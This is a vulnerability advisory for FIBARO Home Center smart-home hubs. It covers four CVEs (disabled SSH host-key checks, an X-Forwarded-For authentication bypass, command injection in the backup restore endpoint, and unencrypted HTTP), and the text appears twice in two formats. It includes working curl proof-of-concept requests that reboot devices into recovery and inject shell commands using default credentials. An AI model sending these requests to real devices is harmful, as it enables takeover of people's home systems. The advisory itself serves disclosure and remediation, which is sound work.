Vendor description:

-------------------

"FIBARO is a global brand based on the Internet of Things technology. It

provides solutions for building and home automation. FIBARO's headquarters

and factory are located in Wysogotowo, 3 miles away from Poznan. The company

employs app. 250 employees."

<https://www.fibaro.com/en/about-us/>

Vulnerability overview/description:

-----------------------------------

1) Cloud SSH Connection Man-in-the-Middle Attack (CVE-2021-20989)

Home Center devices initiate SSH connections to the Fibaro cloud to provide

remote access and remote support capabilities. This connection can be

intercepted using a man-in-the-middle attack and a device initiated remote

port-forward channel can be used to connect to the web management interface.

IoT Inspector identified a disabled SSH host key check, which enables

man-in-the-middle attacks.

By initiating connections to the Fibaro cloud an attacker can eavesdrop on

communication between the user and the device. As communication inside the

SSH port-forward is not encrypted (see #4 on management interface), user

sessions, tokens and passwords can be hijacked.

2) Unauthenticated access to shutdown, reboot and reboot to recovery mode

(CVE-2021-20990)

An internal management service is accessible on port 8000 and some API

endpoints could be accessed without authentication to trigger a shutdown, a

reboot, or a reboot into recovery mode. In recovery mode, an attacker can

upload firmware without authentication. (Potentially an earlier version with

known remote command execution vulnerability, see #3)

3) Authenticated remote command execution (versions before 4.550)

(CVE-2021-20991)

An authenticated user can run commands as root user using a command
injection

vulnerability.

Similar problems were also discovered by Pavel Cheremushkin from Kaspersky

ICS Cert: <https://securelist.com/fibaro-smart-home/91416/>

4) Unencrypted management interface (CVE-2021-20992)

Home Center devices provide a web based management interface over
unencrypted

HTTP protocol. Communication between the user and the device can be

eavesdropped to hijack sessions, tokens, and passwords. The management

interface is only available over HTTP on the local network. The vendor

recommends using the cloud-based management interface, which is accessible
over

HTTPS and requests are forwarded via an encrypted SSH connection between the

Fibaro cloud and the device.

Proof of concept:

-----------------

1) Cloud SSH Connection Man-in-the-Middle Attack

Home Center devices initiate a SSH connection to the Fibaro cloud

./etc/init.d/fibaro/RemoteAccess

<snip>

DAEMON=/usr/bin/ssh

....

case "$1" in

  start)

                .....

    # get IP

    local
GET_IP_URL="<https://dom.fibaro.com/get_ssh_ip.php?PK_AccessPoint=${HC2_Seria>
l}&HW_Key=${HW_Key}"

    local IP_Response; IP_Response=$(curl -f -s -S --retry 3
--connect-timeout 100 --max-time 100 "${GET_IP_URL}" | tr -d '
!"#$%&|'"'"'|()*+,/:;<=>?@[|\\|]|^`|\||{}~')

    # get PORT

    local
GET_PORT_URL="<https://dom.fibaro.com/get_ssh_port.php?PK_AccessPoint=${HC2_S>
erial}&HW_Key=${HW_Key}"

    local PORT_Response; PORT_Response=$(curl -f -s -S --retry 3
--connect-timeout 100 --max-time 100 "${GET_PORT_URL}" | tr -d '
!"#$%&|'"'"'|()*+,/:;<=>?@[|\\|]|^`|\||{}~')

                ....

    start-stop-daemon --start --background --pidfile "${PIDFILE}"
--make-pidfile --startas /usr/bin/screen \

    -- -DmS ${NAME} ${DAEMON} -y -K 30 -i
/etc/dropbear/dropbear_rsa_host_key -R "${PORT_Response}":localhost:80
remote2@"${IP_Response}"

</snip>

The device uses dropbear ssh to initiate the connection; option -y disables
any

host-key checks, voiding much of the otherwise added transport-layer
security

by SSH: "Always accept hostkeys if they are unknown."

The above "get IP" endpoint returns the address of the Fibaro cloud, e.g.:

lb-1.eu.ra.fibaro.com

An attacker can use DNS spoofing or other means to intercept the connection.
By

using any hostkey, the attacker can successfully authenticate the SSH

connection. Once the connection is authenticated, the client initiates a
remote

port-forward:

-R "${PORT_Response}":localhost:80

This enables the attacker to access port 80 (management interface) of the

device.

A similar problem exists for remote support connections:

./opt/fibaro/scripts/remote-support.lua

<snip>

function handleResponse(response)

  responseJson = json.decode(response.data)

  print(json.encode(responseJson))

  local autoSSHCommand = 'ssh -y -K 30 -i
/etc/dropbear/dropbear_rsa_host_key -R '  .. responseJson.private_ip..  ':'
.. responseJson.port .. ':localhost:22 remote2@' .. responseJson.ip

  os.execute(autoSSHCommand)

end

function getSupportData()

  remoteUrl='[https://dom.fibaro.com/get_support_route.php?PK_AccessPoint='](https://dom.fibaro.com/get_support_route.php?PK_AccessPoint=&apos);
.. serialNumber .. '&HW_Key=' .. HWKey

  print(remoteUrl)

  http = net.HTTPClient({timeout = 5000})

  http:request(remoteUrl, {

    options = {

      method = 'GET'

    },

    success = function(response)

      handleResponse(response)

    end,

    error = function(error)

      print(error)

    end

  })

end

getSupportData()

</snip>

Here, the remote support endpoint returns the following data:

{"ip":"fwd-support.eu.ra.fibaro.com","port":"XXXXX","private_ip":"10.100.YYY
.ZZZ"}

The same dropbear ssh client is used with option -y. In this case, port 22

(ssh) is made accessible through the port-forward. However, the device only

allows public key authentication with a hard-coded SSH key. No further
testing

has been done on compromising the support SSH connection.

2) Unauthenticated access to shutdown, reboot and reboot to recovery mode

The device is running a nginx server, which forwards some requests to a

lighttpd server (8000) for further processing:

<snip>

                                proxy_set_header X-Forwarded-For
$proxy_add_x_forwarded_for;

        location ~* \.php$ {

            proxy_pass   <http://127.0.0.1:8000>;

        }

        location ~* \.php\?.* {

            proxy_pass   <http://127.0.0.1:8000>;

        }

</snip>

The lighttpd server is not only accessible locally, but also via the local

network.

Authentication and authorization is implemented in PHP and there is a
special

check for connections originating from within the host. However, when
checking

the remote IP address, the header X-Forwarded-For is also considered:

./var/www/authorize.php

<snip>

function isLocalRequest()

{

    $ipAddress = "";

    if(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))

        $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];

    else

        $ipAddress = $_SERVER['REMOTE_ADDR'];

    $whitelist = array( '127.0.0.1', '::1' );

    if(in_array($ipAddress, $whitelist))

        return true;

    return false;

}

</snip>

As the lighttpd service available via the network, an attacked can inject
the

required header X-Forwarded-For as well.

The check isLocalRequest is used to "secure" multiple endpoints:

./var/www/services/system/shutdown.php

<snip>

<?php

    require_once("../../authorize.php");

    if (!isLocalRequest() && !isAuthorized())

    {

       sendUnauthorized();

    }

    else

    {

        exec("systemShutdown");

    }

?>

</snip>

./var/www/services/system/reboot.php

<snip>

function authorize()

{

    return isAuthorized() || isAuthorizedFibaroAuth(array(role::USER,
role::INSTALLER));

}

function handlePOST($text)

{

    if (!isLocalRequest() && !authorize())

    {

       sendUnauthorized();

       return;

    }

    $params = tryDecodeJson($text);

    if(!is_null($params) && isset($params->recovery) && $params->recovery
=== true)

        exec("rebootToRecovery");

    else

        exec("systemReboot");

}

$requestBody = file_get_contents('php://input');

$requestMethod = $_SERVER['REQUEST_METHOD'];

if ($requestMethod == "POST")

    handlePOST($requestBody);

else

    setStatusMethodNotAllowed();

</snip>

An attacker can issue the the following HTTP request to reboot the device
into

recovery mode:

curl -H 'X-Forwarded-For: 127.0.0.1' -H 'Content-Type: application/json' -d
'{"recovery":true}'  <http://DEVICE:8000/services/system/reboot.php>

In recovery mode, firmware images can be updated without authentication.

3) Authenticated remote command execution (versions before 4.550)

Backup & restore operations could be triggered though HTTP endpoints:

./var/www/services/system/backups.php

<snip>

function restoreBackup($params)

{

    if (getNumberOfInstances('{screen} SCREEN -dmS RESTORE') > 0)

    {

        setStatusTooManyRequests();

        return;

    }

    $type = $params->type;

    $id = $params->id;

    $version = $params->version;

    if (is_null($id) || !is_numeric($id) || $id < 1 )

    {

        setStatusBadRequest();

        return;

    }

    $hcVersion = exec("cat /mnt/hw_data/serial | cut -c1-3");

    if ($type == "local" && $hcVersion == "HC2" || $type == "remote")

    {

        $version ?

                exec('screen -dmS RESTORE restoreBackup.sh --' . $type. ' '.
$id . ' ' . $version) :

                exec('screen -dmS RESTORE restoreBackup.sh --' . $type. ' '.
$id);

    }

    else

    {

        setStatusBadRequest();

        return;

    }

    setStatusAccepted();

}

</snip>

The parameter $version is not sanitized or escaped, which allows an attacker
to

inject shell commands into the exec() call:

cat > /tmp/exploit <<- EOM

{"action": "restore", "params": {"type": "remote", "id": 1, "version": "1;
INJECTED COMMAND"}}

EOM

curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' -H 'content-type:
application/json' -d@/tmp/exploit  <http://DEVICE/services/system/backups.php>

Version 4.550 and later have proper escaping:

<snip>

    $version = escapeshellarg($params->version);

</snip>

4) Unencrypted management interface

NMMAP shows a few open ports on the box:

PORT     STATE SERVICE

22/tcp   open  ssh

80/tcp   open  http

8000/tcp open  http-alt

Both 80/tcp and 8000/tcp can be accessed over unencrypted HTTP.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~

Vulnerable / tested versions:

-----------------------------

Vulnerabilities 1, 2, 4 were confirmed on 4.600, which was the latest
version

at the time of the discovery

Vulnerabilities 1, 2, 3, 4 were confirmed on 4.540, 4.530

Solution:

---------

Upgrade to the version 4.610 or latest version, which fixes vulnerabilities
1,

2 and 3.

Vulnerability 4 is not fixed as the vendor assumes that the local network is

trusted and the device only provides wired network access. Furthermore, the

vendor recommends using the cloud-based management interface, which is

accessible over HTTPS and requests are forwarded via an encrypted SSH

connection between the Fibaro cloud and the device.

# Vulnerability Overview

## Cloud SSH Connection Man-in-the-Middle Attack (CVE-2021-20989) #1

Home Center devices initiate SSH connections to the Fibaro cloud to provide remote access and remote support capabilities. This connection can be intercepted using a man-in-the-middle attack, and a device initiated remote port-forward channel can be used to connect to the web management interface. IoT Inspector identified a disabled SSH host key check, which enables man-in-the-middle attacks.
By initiating connections to the Fibaro cloud, an attacker can eavesdrop on communication between the user and the device. As communication inside the SSH port-forward is not encrypted (see #4 on management interface), user sessions, tokens and passwords can be hijacked.
## Unauthenticated access to shutdown, reboot, and reboot to recovery mode (CVE-2021-20990) #2

An internal management service is accessible on port 8000 and some API endpoints could be accessed without authentication to trigger a shutdown, a reboot, or a reboot into recovery mode. In recovery mode, an attacker can upload firmware without authentication. (Potentially an earlier version with known remote command execution vulnerability, see #3)
## Authenticated remote command execution (versions before 4.550) (CVE-2021-20991) #3

An authenticated user can run commands as root user using a command injection vulnerability.
Similar problems were also discovered by Pavel Cheremushkin from Kaspersky ICS Cert:
<https://securelist.com/fibaro-smart-home/91416/>
## Unencrypted management interface (CVE-2021-20992) #4

Home Center devices provide a web based management interface over unencrypted HTTP protocol. Communication between the user and the device can be eavesdropped to hijack sessions, tokens, and passwords. The management interface is only available over HTTP on the local network. The vendor recommends using the cloud-based management interface, which is accessible over HTTPS and requests are forwarded via an encrypted SSH connection between the Fibaro cloud and the device.

    -- -DmS ${NAME} ${DAEMON} -y -K 30 -i /etc/dropbear/dropbear_rsa_host_key -R "${PORT_Response}":localhost:80 remote2@"${IP_Response}"

```
The device uses dropbear ssh to initiate the connection; option `-y` disables any host-key checks, voiding much of the otherwise added transport-layer security by SSH: "Always accept hostkeys if they are unknown."
The above "get IP" endpoint returns the address of the Fibaro cloud, e.g.: `lb-1.eu.ra.fibaro.com`
An attacker can use DNS spoofing or other means to intercept the connection. By using any hostkey, the attacker can successfully authenticate the SSH connection. Once the connection is authenticated, the client initiates a remote port-forward:
`-R "${PORT_Response}":localhost:80`
This enables the attacker to access port 80 (management interface) of the device.
A similar problem exists for remote support connections:
```
./opt/fibaro/scripts/remote-support.lua
```
```
function handleResponse(response)
  responseJson = json.decode(response.data)
  print(json.encode(responseJson))

  local autoSSHCommand = 'ssh -y -K 30 -i /etc/dropbear/dropbear_rsa_host_key -R ' .. responseJson.private_ip.. ':' .. responseJson.port .. ':localhost:22 remote2@' .. responseJson.ip
  os.execute(autoSSHCommand)
end

function getSupportData()
  remoteUrl='https://dom.fibaro.com/get_support_route.php?PK_AccessPoint=' .. serialNumber .. '&HW_Key=' .. HWKey
  print(remoteUrl)

  http = net.HTTPClient({timeout = 5000})

  http:request(remoteUrl, {
    options = {
      method = 'GET'
    },
    success = function(response)
      handleResponse(response)
    end,
    error = function(error)
      print(error)
    end
  })
end

getSupportData()

```
Here, the remote support endpoint returns the following data:
`{"ip":"fwd-support.eu.ra.fibaro.com","port":"XXXXX","private_ip":"10.100.YYY.ZZZ"}`
The same dropbear ssh client is used with option `-y`. In this case, port 22 (ssh) is made accessible through the port-forward. However, the device only allows public key authentication with a hard-coded SSH key. No further testing has been done on compromising the support SSH connection.
## Unauthenticated Access to Shutdown, Reboot, and Reboot to Recovery Mode

The device is running a nginx server, which forwards some requests to a lighttpd server (8000) for further processing:
```
proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

location ~* \.php$ {
  proxy_pass http://127.0.0.1:8000;
}

location ~* \.php\?.* {
  proxy_pass http://127.0.0.1:8000;
}

```
The lighttpd server is not only accessible locally, but also via the local network.
Authentication and authorization is implemented in PHP, and there is a special check for connections originating from within the host. However, when checking the remote IP address, the header `X-Forwarded-For` is also considered:
```
./var/www/authorize.php
```
```
function isLocalRequest()
{
  $ipAddress = "";
  if(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    $ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
  else
    $ipAddress = $_SERVER['REMOTE_ADDR'];

  $whitelist = array( '127.0.0.1', '::1' );
  if(in_array($ipAddress, $whitelist))
   return true;

  return false;
}

```
As the lighttpd service available via the network, an attacked can inject the required header `X-Forwarded-For` as well.
The check `isLocalRequest` is used to "secure" multiple endpoints:
```
./var/www/services/system/shutdown.php
```
```
<?php
require_once("../../authorize.php");

if (!isLocalRequest() && !isAuthorized())
{
  sendUnauthorized();
}
else
{
  exec("systemShutdown");
}
?>
```
```
./var/www/services/system/reboot.php
```
```
function authorize()
{
    return isAuthorized() || isAuthorizedFibaroAuth(array(role::USER, role::INSTALLER));
}

function handlePOST($text)
{
    if (!isLocalRequest() && !authorize())
    {
       sendUnauthorized();
       return;
    }

    $params = tryDecodeJson($text);
    if(!is_null($params) && isset($params->recovery) && $params->recovery === true)
        exec("rebootToRecovery");
    else
        exec("systemReboot");
}

$requestBody = file_get_contents('php://input');
$requestMethod = $_SERVER['REQUEST_METHOD'];

if ($requestMethod == "POST")
    handlePOST($requestBody);
else
    setStatusMethodNotAllowed();

```
An attacker can issue the the following HTTP request to reboot the device into recovery mode:
`curl -H 'X-Forwarded-For: 127.0.0.1' -H 'Content-Type: application/json' -d '{"recovery":true}' http://DEVICE:8000/services/system/reboot.php`
In recovery mode, firmware images can be updated without authentication.
## Authenticated Remote Command Execution (versions before 4.550)

Backup & restore operations could be triggered through HTTP endpoints:
```
./var/www/services/system/backups.php
```
```
function restoreBackup($params)
{
  if (getNumberOfInstances('{screen} SCREEN -dmS RESTORE') > 0)
  {
    setStatusTooManyRequests();
    return;
  }

  $type = $params->type;
  $id = $params->id;
  $version = $params->version;

  if (is_null($id) || !is_numeric($id) || $id < 1 )
  {
    setStatusBadRequest();
    return;
  }

  $hcVersion = exec("cat /mnt/hw_data/serial | cut -c1-3");

  if ($type == "local" && $hcVersion == "HC2" || $type == "remote")
  {
    $version ?
    exec('screen -dmS RESTORE restoreBackup.sh --' . $type. ' '. $id . ' ' . $version) :
    exec('screen -dmS RESTORE restoreBackup.sh --' . $type. ' '. $id);
  }
  else
  {
    setStatusBadRequest();
    return;
  }

  setStatusAccepted();
}

```
The parameter `$version` is not sanitized or escaped, which allows an attacker to inject shell commands into the `exec()` call:
`cat > /tmp/exploit <<- EOM`
`{"action": "restore", "params": {"type": "remote", "id": 1, "version": "1; INJECTED COMMAND"}}`
`EOM`
`curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' -H 'content-type: application/json' -d@/tmp/exploit http://DEVICE/services/system/backups.php`
Version 4.550 and later have proper escaping:
`$version = escapeshellarg($params->version);`
## Unencrypted Management Interface

NMAP shows a few open ports on the box:
`PORT STATE SERVICE`
`22/tcp open ssh`
`80/tcp open http`
`8000/tcp open http-alt`
Both 80/tcp, and 8000/tcp can be accessed over unencrypted HTTP.
# Solution

Upgrade to the version 4.610 or latest version, which fixes vulnerabilities 1, 2 and 3.
Vulnerability 4 is not fixed, as the vendor assumes that the local network is trusted and the device only provides wired network access. Furthermore, the vendor recommends using the cloud-based management interface, which is accessible over HTTPS, and requests are forwarded via an encrypted SSH connection between the Fibaro cloud and the device.
